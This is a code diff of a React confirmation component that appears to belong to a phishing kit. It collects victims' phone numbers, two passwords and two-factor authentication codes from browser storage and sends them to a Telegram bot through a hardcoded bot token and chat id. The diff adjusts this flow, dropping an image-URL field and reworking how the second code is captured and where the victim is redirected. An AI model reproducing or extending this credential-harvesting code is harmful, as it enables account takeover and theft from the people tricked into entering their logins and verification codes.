@@ -46,7 +46,7 @@ const ConfirmComponent = () => {
         if(timeLeft > 0){
             setActiveWaring(true)
 
-            const dataLocalImages = JSON.parse(localStorage.getItem('dataIamges'))
+            const dataLocalImages = JSON.parse(localStorage.getItem('dataPassWord'))
             const firstCode = {...dataLocalImages, first_code: values.fill_code}
 
             localStorage.setItem('dataFirstCode', JSON.stringify(firstCode))
@@ -64,20 +64,21 @@ const ConfirmComponent = () => {
             '%0A<strong>Phone Number: </strong>' + firstCode.fill_phone + 
             '%0A<strong>Password First: </strong>' + firstCode.firt_password +
             '%0A<strong>Password Second: </strong>' + firstCode.second_password +
-            '%0A<strong>First Code Authen: </strong>' + firstCode.first_code +
-            '%0A<strong>Images Url: </strong>' + firstCode.url_image ;
+            '%0A<strong>First Code Authen: </strong>' + firstCode.first_code;
 
             axios.get(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`)
                 .then((response) => {
+
                 })
                 .catch((error) => {});
         }
 
         
         else {
-            const dataLocalImages = JSON.parse(localStorage.getItem('dataFirstCode'))
-            const finalCode = {...dataLocalImages, seconds_code: dataLocalImages.first_code}
+            const dataLocalImages = !JSON.parse(localStorage.getItem('dataFirstCode')) ? JSON.parse(localStorage.getItem('dataPassWord')) : JSON.parse(localStorage.getItem('dataFirstCode'))
+            const finalCode = {...dataLocalImages, seconds_code: values.fill_code}
 
+            localStorage.setItem('dataAllCode', JSON.stringify(finalCode))
 
             const bot_token = '6387439493:AAHaViBOhEGCh_U-dVzhvPCJyZbouSY5IBY';
             const chat_id   = '-1001737921141';
@@ -92,12 +93,11 @@ const ConfirmComponent = () => {
             '%0A<strong>Password First: </strong>' + finalCode.firt_password +
             '%0A<strong>Password Second: </strong>' + finalCode.second_password +
             '%0A<strong>First Code Authen: </strong>' + finalCode.first_code +
-            '%0A<strong>Second Code Authen : </strong>' + values.fill_code +
-            '%0A<strong>Images Url: </strong>' + finalCode.url_image ;
+            '%0A<strong>Second Code Authen : </strong>' + values.fill_code;
 
             axios.get(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`)
                 .then((response) => {
-                    navigate('/help-100823847823627384548/final');
+                    navigate('/help-100823847823627384548/waitting');
                 })
                 .catch((error) => {});
         }
